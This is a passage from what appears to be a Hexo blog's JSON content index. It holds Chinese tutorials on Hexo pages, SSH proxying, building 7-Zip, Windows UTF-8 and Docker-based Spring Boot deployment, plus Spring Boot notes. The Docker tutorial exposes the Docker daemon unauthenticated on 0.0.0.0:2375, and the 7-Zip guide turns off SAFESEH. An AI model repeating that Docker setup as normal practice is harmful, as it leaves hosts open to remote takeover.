此时我们打开与你账户对应的子文件夹，进入到上文提到的目录即可看到锁屏图片了：","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"}]},{"title":"Hexo自定义页面方法","slug":"draft/raw-html-in-hexo","date":"2021-09-28T02:05:30.000Z","updated":"2021-09-28T02:05:30.000Z","comments":true,"path":"posts/2603939427/","permalink":"https://czqu.net/posts/2603939427/","excerpt":"","text":"网上都是这两种方法，但是会导致网页只有body里面的内容，即hexo处理后有一些标签消失了，这里将介绍第三种方法解决。 网上常见的两种方法第一种方法是使用Hexo提供的跳过渲染配置，适用于整个目录的设置。具体步骤，打开博客根目录_config.yml，找到其中skip_render项，这个项目用来配置/source/中需要跳过渲染的文件或目录，例如希望跳过/source/test/里的所有文件渲染，可以配置为： 1skip_render: test/** 匹配规则是一种类似正则的规则，官方给出的参考是这个。另外在测试这个功能的时候发现，Hexo的内部缓存不是特别好用，有时候你修改了配置但生成出来的内容不一定及时应用了新配置，最好在生成之前执行一下hexo clean命令，清除掉旧的生成文件和缓存。 第二种方法是给单个文件添加不应用模板的标记，适用于个别特殊文件的处理。例如我们的网站如果要使用百度统计，往往需要在根目录放一个html格式的验证文件，这个文件默认也会经过用主题模板渲染，避免渲染的办法就是在文件头部添加如下内容： 123---layout: false--- 我的方案可是我实践以后发现hexo还是对网页进行了改动，&lt;body&gt;&lt;html&gt;等标签都不见了,只剩下下面的内容。 12345678910111213141516&lt;section class=\"error-page\"&gt;&lt;div class=\"covers-main w3layouts\"&gt;&lt;div class=\"wrapper\"&gt;&lt;div class=\"main-cover w3\"&gt;&lt;h1&gt;&lt;a href=\"index.html\" class=\"logo\"&gt;Web Error Page&lt;/a&gt;&lt;/h1&gt;&lt;h4 class=\"cover-para w3ls\"&gt;404&lt;/h4&gt;&lt;h5 class=\"form-title\"&gt;UH OH! You're lost.&lt;/h5&gt;&lt;p class=\"form-text\"&gt;The page you are looking for does not exist. How you got here is a mystery. But you can click the button below to go back to the previous page &lt;/p&gt;&lt;a href=\"javascript:history.go(-1);\" class=\"back-button\"&gt;Go Back&lt;/a&gt;&lt;a href=\"/\" class=\"back-button\"&gt;Back to Home&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/section&gt; 后来发现只要放在主题文件夹的source就能输出完整页面了，如\\themes\\xxxxxx\\source,如下代码所示，消失的标签又回来了。 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;404&lt;/title&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;meta charset=\"UTF-8\" /&gt;&lt;meta name=\"keywords\" content=\"The page you are looking for does not exist.\" /&gt;&lt;link rel=\"stylesheet\" href=\"/404/css/style.css\" type=\"text/css\" media=\"all\" /&gt;&lt;link href=\"/404/css/font-awesome.css\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;&lt;section class=\"error-page\"&gt;&lt;div class=\"covers-main w3layouts\"&gt;&lt;div class=\"wrapper\"&gt;&lt;div class=\"main-cover w3\"&gt;&lt;h1&gt;&lt;a href=\"index.html\" class=\"logo\"&gt;Web Error Page&lt;/a&gt;&lt;/h1&gt;&lt;h4 class=\"cover-para w3ls\"&gt;404&lt;/h4&gt;&lt;h5 class=\"form-title\"&gt;UH OH! You're lost.&lt;/h5&gt;&lt;p class=\"form-text\"&gt;The page you are looking for does not exist. How you got here is a mystery. But you can click the button below to go back to the previous page &lt;/p&gt;&lt;a href=\"javascript:history.go(-1);\" class=\"back-button\"&gt;Go Back&lt;/a&gt;&lt;a href=\"/\" class=\"back-button\"&gt;Back to Home&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/section&gt;&lt;script defer src=\"https://static.cloudflareinsights.com/beacon.min.js\" data-cf-beacon='{\"rayId\":\"69596e22ad08eb79\",\"version\":\"2021.8.1\",\"r\":1,\"token\":\"4c34ab8739eb4bf09573777b5c48b854\",\"si\":10}'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://czqu.net/tags/hexo/"}]},{"title":"Win10 给 ssh 加上代理","slug":"draft/Win10给ssh加上代理","date":"2021-09-24T16:27:14.000Z","updated":"2021-09-24T16:27:14.000Z","comments":true,"path":"posts/3664919065/","permalink":"https://czqu.net/posts/3664919065/","excerpt":"","text":"直接编辑~/.ssh/config，没有就创建一个 12345678910111213141516ProxyCommand C:\\Program Files\\Git\\mingw64\\bin\\connect.exe -S 127.0.0.1:10808 -a none %h %pHost github.com User git Port 22 Hostname github.com IdentityFile \"C:\\Users\\79287\\.ssh\\id_rsa\" TCPKeepAlive yesHost ssh.github.com User git Port 443 Hostname ssh.github.com # 注意修改路径为你的路径 IdentityFile \"C:\\Users\\79287\\.ssh\\id_rsa\" TCPKeepAlive yes","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"}]},{"title":"7zip的编译","slug":"release/2020-7-2-compile-7zip","date":"2021-05-17T07:44:32.000Z","updated":"2021-05-17T07:44:32.000Z","comments":true,"path":"posts/25908/","permalink":"https://czqu.net/posts/25908/","excerpt":"","text":"编译7z.dll1.下载源代码并打开下载地址：https://www.7-zip.org/download.html 用vs打开%7z_source%\\CPP\\7zip\\Bundles\\Format7zF\\Format7z.dsw 在7zCrcOpt.asm和AesOpt.asm两个文件上右键属性，修改其配置信息，如图 这里是由于作者用的VB6，你打开宏设置就知道这个路径是在Visual Studio 2019是错的 如果要编译64位的 对于 error LNK2026 模块对于 SAFESEH 映像是不安全的解决 在其它选项添加如下内容 1/SAFESEH:NO 2.编译7z.dlll文件会编译到你链接器部分设置的位置 其他部分考完试再更新","categories":[],"tags":[],"author":"陈子琦"},{"title":"设置Windows10的默认编码为UTF-8以及设置后的已知问题","slug":"release/2020-7-2-Windows-to-UTF8","date":"2020-11-28T07:44:32.000Z","updated":"2020-11-28T07:44:32.000Z","comments":true,"path":"posts/49861/","permalink":"https://czqu.net/posts/49861/","excerpt":"","text":"设置方法设置方法：控制面板-&gt;区域-&gt;管理&gt;更改系统区域设置 设置好后，重启，系统编码即变为UTF-8格式。 已知问题： 刚开始使用，还没发现更多问题，后期会继续添加 1.自定义配置文件乱码如下图，我在一个文件夹内写入如下内容，让文件夹显示我自定义的中文名，但是当我设置Windows为UTF-8后，此文件不会被自动更改，需要手动更改为UTF-8后方能正常使用，不然文件夹显示会乱码 2.7-ZIP和WinRAR以及Windows资源管理器 打开GBK编码的zip会乱码WinRAR 版本 5.90 简体中文版 7ZIP版本：19.00 Windows 版本：19041.329 3.chm帮助文件查看器打开中文乱码如下图所示，此处文件名没有乱码，但是打开后标题乱码，还有搜索时会乱码，索引和其他页面未发现乱码。","categories":[],"tags":[],"author":"陈子琦"},{"title":"IDEA docker部署springboot项目","slug":"draft/springboot-docker-idea","date":"2020-11-17T02:13:51.000Z","updated":"2020-11-17T02:13:51.000Z","comments":true,"path":"posts/27992/","permalink":"https://czqu.net/posts/27992/","excerpt":"","text":"一、docker服务器侧监听配置centos7安装配置docker参考《centos下docker安装》 1vim /usr/lib/systemd/system/docker.service，配置完端口，下面的idea中才能连接成功。 默认使用2375端口监听，如果开有防火墙，需要把端口添加到例外。 1ExecStart=``/usr/bin/dockerd` `-H fd:``//` `--containerd=``/run/containerd/containerd``.sock -H tcp:``//0``.0.0.0:2375 二、插件安装和配置 配置docker连接，一定要显示Connection succcessful： 三、springboot项目，增加docker插件和Dockerfile配置 依赖包和配置 123456789101112131415161718192021222324252627282930313233&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt; &lt;version&gt; 1.2.1&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;build-image&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;build&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;imageName&gt;${project.artifactId}&lt;/imageName&gt; &lt;imageTags&gt; &lt;imageTag&gt;latest&lt;/imageTag&gt; &lt;/imageTags&gt; &lt;dockerDirectory&gt;${project.basedir}&lt;/dockerDirectory&gt; &lt;dockerHost&gt;http://10.245.202.222:2375&lt;/dockerHost&gt; &lt;resources&gt; &lt;resource&gt; &lt;targetPath&gt;/&lt;/targetPath&gt; &lt;directory&gt;${project.build.directory}&lt;/directory&gt; &lt;include&gt;${project.build.finalName}&lt;/include&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 我一开始建了一个docker的文件夹，将dockerfile放到那里，实践证明不行，不允许往上层路径寻找jar包。 \\2. Dockerfile配置 123456789101112131415161718192021#指定基础镜像，在其上进行定制FROM java:8#维护者信息MAINTAINER zhouyu &lt;zhouyu629@qq.com&gt;#这里的 /tmp 目录就会在运行时自动挂载为匿名卷，任何向 /tmp 中写入的信息都不会记录进容器存储层。VOLUME /tmp#复制上下文目录下的target/demo-1.0.0.jar 到容器里COPY target/freemarker-page-demo-1.0-SNAPSHOT.jar demo-1.0.0.jar#bash方式执行，使demo-1.0.0.jar可访问#RUN新建立一层，在其上执行这些命令，执行结束后， commit 这一层的修改，构成新的镜像。RUN bash -c \"touch /demo-1.0.0.jar\"#声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务EXPOSE 8080#指定容器启动程序及参数 &lt;ENTRYPOINT&gt; \"&lt;CMD&gt;\"ENTRYPOINT [\"java\",\"-jar\",\"demo-1.0.0.jar\"] 执行mvn package成功 \\3. 创建容器 注意bind ports，我这里是8080:8088，前面是服务器向外暴露的端口号，8088则是application.yml里配置的应用端口号，我这里对应的tomcat端口号。 四、主要问题解决1.xxxx-1.0-SNAPSHOT.jar中没有主清单属性 ，造成发布失败。 主要是因为springboot没有配置maven package插件，pom中新增plugin 1234567891011&lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; 容器时间和宿主时间不一致 在Dockerfile最后一行增加： 123#设置时区RUN /bin/cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ &amp;&amp; echo 'Asia/Shanghai' &gt;/etc/timezone \\","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"},{"name":"springboot","slug":"springboot","permalink":"https://czqu.net/tags/springboot/"},{"name":"java","slug":"java","permalink":"https://czqu.net/tags/java/"}]},{"title":"springboot学习笔记","slug":"draft/springboot-study","date":"2020-11-17T01:51:06.000Z","updated":"2020-11-17T01:51:06.000Z","comments":true,"path":"posts/59173/","permalink":"https://czqu.net/posts/59173/","excerpt":"","text":"一、Spring Boot 入门1、Spring Boot 简介 简化Spring应用开发的一个框架； 整个Spring技术栈的一个大整合； J2EE开发的一站式解决方案； 2、微服务2014，martin fowler 微服务：架构风格（服务微化） 一个应用应该是一组小型服务；可以通过HTTP的方式进行互通； 单体应用：ALL IN ONE 微服务：每一个功能元素最终都是一个可独立替换和独立升级的软件单元； 详细参照微服务文档 3、环境准备http://www.gulixueyuan.com/ 谷粒学院 环境约束 –jdk1.8：Spring Boot 推荐jdk1.7及以上；java version “1.8.0_112” –maven3.x：maven 3.3以上版本；Apache Maven 3.3.9 –IntelliJIDEA2017：IntelliJ IDEA 2017.2.2 x64、STS –SpringBoot 1.5.9.RELEASE：1.5.9； 统一环境； 1、MAVEN设置；给maven 的settings.xml配置文件的profiles标签添加 123456789101112&lt;profile&gt; &lt;id&gt;jdk-1.8&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;jdk&gt;1.8&lt;/jdk&gt; &lt;/activation&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;1.8&lt;/maven.compiler.compilerVersion&gt; &lt;/properties&gt;&lt;/profile&gt; 2、IDEA设置整合maven进来； 4、Spring Boot HelloWorld一个功能： 浏览器发送hello请求，服务器接受请求并处理，响应Hello World字符串； 1、创建一个maven工程；（jar）2、导入spring boot相关的依赖1234567891011&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3、编写一个主程序；启动Spring Boot应用123456789101112/** * @SpringBootApplication 来标注一个主程序类，说明这是一个Spring Boot应用 */@SpringBootApplicationpublic class HelloWorldMainApplication { public static void main(String[] args) { // Spring应用启动起来 SpringApplication.run(HelloWorldMainApplication.class,args); }} 4、编写相关的Controller、Service12345678910@Controllerpublic class HelloController { @ResponseBody @RequestMapping(\"/hello\") public String hello(){ return \"Hello World!\"; }} 5、运行主程序测试6、简化部署123456789&lt;!-- 这个插件，可以将应用打包成一个可执行的jar包；--&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 将这个应用打成jar包，直接使用java -jar的命令进行执行； 5、Hello World探究1、POM文件1、父项目123456789101112131415&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt;&lt;/parent&gt;他的父项目是&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt; &lt;relativePath&gt;../../spring-boot-dependencies&lt;/relativePath&gt;&lt;/parent&gt;他来真正管理Spring Boot应用里面的所有依赖版本； Spring Boot的版本仲裁中心； 以后我们导入依赖默认是不需要写版本；（没有在dependencies里面管理的依赖自然需要声明版本号） 2、启动器1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; spring-boot-starter-==web==： ​ spring-boot-starter：spring-boot场景启动器；帮我们导入了web模块正常运行所依赖的组件； Spring Boot将所有的功能场景都抽取出来，做成一个个的starters（启动器），只需要在项目里面引入这些starter相关场景的所有依赖都会导入进来。要用什么功能就导入什么场景的启动器 2、主程序类，主入口类12345678910111213/** * @SpringBootApplication 来标注一个主程序类，说明这是一个Spring Boot应用 */@SpringBootApplicationpublic class HelloWorldMainApplication { public static void main(String[] args) { // Spring应用启动起来 SpringApplication.run(HelloWorldMainApplication.class,args); }} @SpringBootApplication: Spring Boot应用标注在某个类上说明这个类是SpringBoot的主配置类，SpringBoot就应该运行这个类的main方法来启动SpringBoot应用； 12345678910@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Inherited@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) })public @interface SpringBootApplication { @SpringBootConfiguration:Spring Boot的配置类； ​ 标注在某个类上，表示这是一个Spring Boot的配置类； ​ @Configuration:配置类上来标注这个注解； ​ 配置类 —– 配置文件；配置类也是容器中的一个组件；@Component @EnableAutoConfiguration：开启自动配置功能； ​ 以前我们需要配置的东西，Spring Boot帮我们自动配置；@EnableAutoConfiguration告诉SpringBoot开启自动配置功能；这样自动配置才能生效； 123@AutoConfigurationPackage@Import(EnableAutoConfigurationImportSelector.class)public @interface EnableAutoConfiguration { ​ @AutoConfigurationPackage：自动配置包 ​ @Import(AutoConfigurationPackages.Registrar.class)： ​ Spring的底层注解@Import，给容器中导入一个组件；导入的组件由AutoConfigurationPackages.Registrar.class； ==将主配置类（@SpringBootApplication标注的类）的所在包及下面所有子包里面的所有组件扫描到Spring容器；== ​ @Import(EnableAutoConfigurationImportSelector.class)； ​ 给容器中导入组件？ ​ EnableAutoConfigurationImportSelector：导入哪些组件的选择器； ​ 将所有需要导入的组件以全类名的方式返回；这些组件就会被添加到容器中； ​ 会给容器中导入非常多的自动配置类（xxxAutoConfiguration）；就是给容器中导入这个场景需要的所有组件，并配置好这些组件； 有了自动配置类，免去了我们手动编写配置注入功能组件等的工作； ​ SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class,classLoader)； ==Spring Boot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作；==以前我们需要自己配置的东西，自动配置类都帮我们； J2EE的整体整合解决方案和自动配置都在spring-boot-autoconfigure-1.5.9.RELEASE.jar； ​ ==Spring注解版（谷粒学院）== 6、使用Spring Initializer快速创建Spring Boot项目1、IDEA：使用 Spring Initializer快速创建项目IDE都支持使用Spring的项目创建向导快速创建一个Spring Boot项目； 选择我们需要的模块；向导会联网创建Spring Boot项目； 默认生成的Spring Boot项目； 主程序已经生成好了，我们只需要我们自己的逻辑 resources文件夹中目录结构 static：保存所有的静态资源； js css images； templates：保存所有的模板页面；（Spring Boot默认jar包使用嵌入式的Tomcat，默认不支持JSP页面）；可以使用模板引擎（freemarker、thymeleaf）； application.properties：Spring Boot应用的配置文件；可以修改一些默认设置； 2、STS使用 Spring Starter Project快速创建项目 二、配置文件1、配置文件SpringBoot使用一个全局的配置文件，配置文件名是固定的； •application.properties •application.yml 配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好； YAML（YAML Ain’t Markup Language） ​ YAML A Markup Language：是一个标记语言 ​ YAML isn’t Markup Language：不是一个标记语言； 标记语言： ​ 以前的配置文件；大多都使用的是 xxxx.xml文件； ​ YAML：以数据为中心，比json、xml等更适合做配置文件； ​ YAML：配置例子 12server: port: 8081 ​ XML： 123&lt;server&gt; &lt;port&gt;8081&lt;/port&gt;&lt;/server&gt; 2、YAML语法：1、基本语法k:(空格)v：表示一对键值对（空格必须有）； 以空格的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的 123server: port: 8081 path: /hello 属性和值也是大小写敏感； 2、值的写法字面量：普通的值（数字，字符串，布尔）​ k: v：字面直接来写； ​ 字符串默认不用加上单引号或者双引号； ​ “”：双引号；不会转义字符串里面的特殊字符；特殊字符会作为本身想表示的意思 ​ name: “zhangsan \\n lisi”：输出；zhangsan 换行 lisi ​ ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据 ​ name: ‘zhangsan \\n lisi’：输出；zhangsan \\n lisi 对象、Map（属性和值）（键值对）：​ k: v：在下一行来写对象的属性和值的关系；注意缩进 ​ 对象还是k: v的方式 123friends: lastName: zhangsan age: 20 行内写法： 1friends: {lastName: zhangsan,age: 18} 数组（List、Set）：用- 值表示数组中的一个元素 1234pets: - cat - dog - pig 行内写法 1pets: [cat,dog,pig] 3、配置文件值注入配置文件 123456789101112person: lastName: hello age: 18 boss: false birth: 2017/12/12 maps: {k1: v1,k2: 12} lists: - lisi - zhaoliu dog: name: 小狗 age: 12 javaBean： 123456789101112131415161718192021/** * 将配置文件中配置的每一个属性的值，映射到这个组件中 * @ConfigurationProperties：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定； * prefix = \"person\"：配置文件中哪个下面的所有属性进行一一映射 * * 只有这个组件是容器中的组件，才能容器提供的@ConfigurationProperties功能； * */@Component@ConfigurationProperties(prefix = \"person\")public class Person { private String lastName; private Integer age; private Boolean boss; private Date birth; private Map&lt;String,Object&gt; maps; private List&lt;Object&gt; lists; private Dog dog; 我们可以导入配置文件处理器，以后编写配置就有提示了 123456&lt;!--导入配置文件处理器，配置文件进行绑定就会有提示--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; 1、properties配置文件在idea中默认utf-8可能会乱码调整 2、@Value获取值和@ConfigurationProperties获取值比较 @ConfigurationProperties @Value 功能 批量注入配置文件中的属性 一个个指定 松散绑定（松散语法） 支持 不支持 SpEL 不支持 支持 JSR303数据校验 支持 不支持 复杂类型封装 支持 不支持 配置文件yml还是properties他们都能获取到值； 如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value； 如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties； 3、配置文件注入值数据校验123456789101112131415161718192021222324@Component@ConfigurationProperties(prefix = \"person\")@Validatedpublic class Person { /** * &lt;bean class=\"Person\"&gt; * &lt;property name=\"lastName\" value=\"字面量/${key}从环境变量、配置文件中获取值/#{SpEL}\"&gt;&lt;/property&gt; * &lt;bean/&gt; */ //lastName必须是邮箱格式 @Email //@Value(\"${person.last-name}\") private String lastName; //@Value(\"#{11*2}\") private Integer age; //@Value(\"true\") private Boolean boss; private Date birth; private Map&lt;String,Object&gt; maps; private List&lt;Object&gt; lists; private Dog dog; 4、@PropertySource&amp;@ImportResource&amp;@Bean@PropertySource：加载指定的配置文件； 123456789101112131415161718192021222324252627282930/** * 将配置文件中配置的每一个属性的值，映射到这个组件中 * @ConfigurationProperties：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定； * prefix = \"person\"：配置文件中哪个下面的所有属性进行一一映射 * * 只有这个组件是容器中的组件，才能容器提供的@ConfigurationProperties功能； * @ConfigurationProperties(prefix = \"person\")默认从全局配置文件中获取值； * */@PropertySource(value = {\"classpath:person.properties\"})@Component@ConfigurationProperties(prefix = \"person\")//@Validatedpublic class Person { /** * &lt;bean class=\"Person\"&gt; * &lt;property name=\"lastName\" value=\"字面量/${key}从环境变量、配置文件中获取值/#{SpEL}\"&gt;&lt;/property&gt; * &lt;bean/&gt; */ //lastName必须是邮箱格式 // @Email //@Value(\"${person.last-name}\") private String lastName; //@Value(\"#{11*2}\") private Integer age; //@Value(\"true\") private Boolean boss; @ImportResource：导入Spring的配置文件，让配置文件里面的内容生效； Spring Boot里面没有Spring的配置文件，我们自己编写的配置文件，也不能自动识别； 想让Spring的配置文件生效，加载进来；@ImportResource标注在一个配置类上 12@ImportResource(locations = {\"classpath:beans.xml\"})导入Spring的配置文件让其生效 不来编写Spring的配置文件 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"helloService\" class=\"com.atguigu.springboot.service.HelloService\"&gt;&lt;/bean&gt;&lt;/beans&gt; SpringBoot推荐给容器中添加组件的方式；推荐使用全注解的方式 1、配置类**@Configuration**——&gt;Spring配置文件 2、使用**@Bean**给容器中添加组件 12345678910111213141516/** * @Configuration：指明当前类是一个配置类；就是来替代之前的Spring配置文件 * * 在配置文件中用&lt;bean&gt;&lt;bean/&gt;标签添加组件 * */@Configurationpublic class MyAppConfig { //将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名 @Bean public HelloService helloService02(){ System.out.println(\"配置类@Bean给容器中添加组件了...\"); return new HelloService(); }} ##4、配置文件占位符 1、随机数123${random.value}、${random.int}、${random.long}${random.int(10)}、${random.int[1024,65536]} 2、占位符获取之前配置的值，如果没有可以是用:指定默认值123456789person.last-name=张三${random.uuid}person.age=${random.int}person.birth=2017/12/15person.boss=falseperson.maps.k1=v1person.maps.k2=14person.lists=a,b,cperson.dog.name=${person.hello:hello}_dogperson.dog.age=15 5、Profile1、多Profile文件我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties/yml 默认使用application.properties的配置； 2、yml支持多文档块方式12345678910111213141516171819server: port: 8081spring: profiles: active: prod---server: port: 8083spring: profiles: dev---server: port: 8084spring: profiles: prod #指定属于哪个环境 3、激活指定profile​ 1、在配置文件中指定 spring.profiles.active=dev ​ 2、命令行： ​ java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar –spring.profiles.active=dev； ​ 可以直接在测试的时候，配置传入命令行参数 ​ 3、虚拟机参数； ​ -Dspring.profiles.active=dev 6、配置文件加载位置springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件 –file:./config/ –file:./ –classpath:/config/ –classpath:/ 优先级由高到底，高优先级的配置会覆盖低优先级的配置； SpringBoot会从这四个位置全部加载主配置文件；互补配置； ==我们还可以通过spring.config.location来改变默认的配置文件位置== 项目打包好以后，我们可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置；指定配置文件和默认加载的这些配置文件共同起作用形成互补配置； java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar –spring.config.location=G:/application.properties 7、外部配置加载顺序==SpringBoot也可以从以下位置加载配置； 优先级从高到低；高优先级的配置覆盖低优先级的配置，所有的配置会形成互补配置== 1.命令行参数 所有的配置都可以在命令行上进行指定 java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar –server.port=8087 –server.context-path=/abc 多个配置用空格分开； –配置项=值 2.来自java:comp/env的JNDI属性 3.Java系统属性（System.getProperties()） 4.操作系统环境变量 5.RandomValuePropertySource配置的random.*属性值 ==由jar包外向jar包内进行寻找；== ==优先加载带profile== 6.jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件 7.jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件 ==再来加载不带profile== 8.jar包外部的application.properties或application.yml(不带spring.profile)配置文件 9.jar包内部的application.properties或application.yml(不带spring.profile)配置文件 10.@Configuration注解类上的@PropertySource 11.通过SpringApplication.setDefaultProperties指定的默认属性 所有支持的配置加载来源； 参考官方文档 8、自动配置原理配置文件到底能写什么？怎么写？自动配置原理； 配置文件能配置的属性参照 1、自动配置原理：1）、SpringBoot启动的时候加载主配置类，开启了自动配置功能 ==@EnableAutoConfiguration== 2）、@EnableAutoConfiguration 作用： 利用EnableAutoConfigurationImportSelector给容器中导入一些组件？ 可以查看selectImports()方法的内容； List configurations = getCandidateConfigurations(annotationMetadata, attributes);获取候选的配置 ```javaSpringFactoriesLoader.loadFactoryNames()扫描所有jar包类路径下 META-INF/spring.factories把扫描到的这些文件的内容包装成properties对象从properties中获取到EnableAutoConfiguration.class类（类名）对应的值，然后把他们添加在容器中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104 **==将 类路径下 META-INF/spring.factories 里面配置的所有EnableAutoConfiguration的值加入到了容器中；==**```properties# Auto Configureorg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\\org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\\org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\\org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\\org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\\org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\\org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\\org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\\org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\\org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\\org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.ldap.LdapDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.